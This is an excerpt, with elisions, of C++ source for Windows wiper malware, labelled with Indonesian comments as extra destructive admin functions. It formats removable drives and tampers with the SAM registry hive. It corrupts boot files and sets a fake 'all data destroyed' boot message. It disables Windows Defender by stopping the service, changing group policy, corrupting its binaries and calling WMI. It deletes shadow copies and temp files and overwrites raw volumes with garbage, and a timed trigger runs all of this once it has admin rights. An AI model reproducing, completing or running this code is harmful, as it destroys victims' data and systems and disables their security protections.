...
// ======== FUNGSI ADMIN DESTRUCTIVE TAMBAHAN ========
void WipeRemovableMedia() {
    DWORD drives = GetLogicalDrives();
    wchar_t driveRoot[] = L"X:\\";
    ...
    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            ...
            if (GetDriveTypeW(driveRoot) == DRIVE_REMOVABLE) {
                wchar_t formatCmd[100];
                wsprintfW(formatCmd, L"format %s /FS:FAT32 /Q /Y /V:GLITCH", driveRoot);
                
                STARTUPINFOW si = { sizeof(si) };
                PROCESS_INFORMATION pi;
                CreateProcessW(NULL, formatCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
...
void RegistryBinaryInjection() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        DWORD type;
        DWORD size = 0;
        RegQueryValueExW(hKey, L"SAM", NULL, &type, NULL, &size);
        
        if (size > 0) {
            BYTE* data = new BYTE[size];
            if (RegQueryValueExW(hKey, L"SAM", NULL, &type, data, &size) == ERROR_SUCCESS) {
                ...
                RegSetValueExW(hKey, L"SAM", 0, type, data, size);
            }
            delete[] data;
        }
        RegCloseKey(hKey);
...
void CorruptBootFiles() {
    ...
    for (size_t i = 0; i < sizeof(bootFiles)/sizeof(bootFiles[0]); i++) {
        ...
        wsprintfW(filePath, L"%s\\System32\\%s", winDir, bootFiles[i]);
...
void SetCustomBootMessage() {
    ...
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
        ...
        const wchar_t* msg = L"CRITICAL SYSTEM FAILURE\n\nUnauthorized system modification detected\nAll data has been destroyed\nContact your system administrator";
        RegSetValueExW(hKey, L"CrashDumpEnabled", 0, REG_DWORD, (BYTE*)&DWORD(0), sizeof(DWORD));
        RegSetValueExW(hKey, L"DisplayRecovery", 0, REG_DWORD, (BYTE*)&DWORD(1), sizeof(DWORD));
        RegSetValueExW(hKey, L"RecoveryMessage", 0, REG_SZ, (BYTE*)msg, (wcslen(msg) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

void DisableDefender() {
    // Layer 1: Stop Defender service
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm) {
        SC_HANDLE service = OpenServiceW(scm, L"WinDefend", SERVICE_ALL_ACCESS);
        if (service) {
    ...
    // Layer 2: Disable via Group Policy
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
    ...
    // Layer 3: Corrupt Defender binaries
    const wchar_t* defenderFiles[] = {
        L"MsMpEng.exe",
        L"mpcmdrun.exe",
        L"MpSigStub.exe",
        L"mpam-fe.exe"
    ...
    for (size_t i = 0; i < sizeof(defenderFiles)/sizeof(defenderFiles[0]); i++) {
        wchar_t filePath[MAX_PATH];
        wsprintfW(filePath, L"%s\\System32\\%s", winDir, defenderFiles[i]);
    ...
    // Layer 4: Disable via WMI
    wchar_t wmiCmd[] = L"wmic /namespace:\\\\root\\Microsoft\\Windows\\Defender path MSFT_MpPreference call DisableRealtimeMonitoring";
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(NULL, wmiCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

void CleanForensicArtifacts() {
    // Clean shadow copies
    wchar_t vssCmd[] = L"vssadmin delete shadows /all /quiet";
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(NULL, vssCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    ...
    // Clear recent documents and jump lists
    SHAddToRecentDocs(SHARD_PATHW, NULL);
    
    // Clear temp files
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    wchar_t delCmd[MAX_PATH + 20];
    wsprintfW(delCmd, L"del /f /q /s \"%s*\"", tempPath);
    CreateProcessW(NULL, delCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
        ...
        if (drives & (1 << i)) {
            ...
            if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) {
                ...
                if (GetVolumeNameForVolumeMountPointW(driveRoot, volumeName, MAX_PATH)) {
                    HANDLE hDevice = CreateFileW(volumeName, GENERIC_WRITE, 
                    ...
                    if (hDevice != INVALID_HANDLE_VALUE) {
                        ...
                        for (int j = 0; j < 2048; j++) {
                            WriteFile(hDevice, garbage, 512, &bytesWritten, NULL);
                        }
    ...
    if (!criticalMode && cTime - startTime > 30000) {
        ...
        if (g_isAdmin) {
            ...
            if (!adminDestructionDone) {
                // Fungsi tambahan destruktif
                CleanForensicArtifacts();
                WipeRemovableMedia();
                RegistryBinaryInjection();
                CorruptBootFiles();
                DisableDefender();
                SetCustomBootMessage();
                WipeAllDrives();
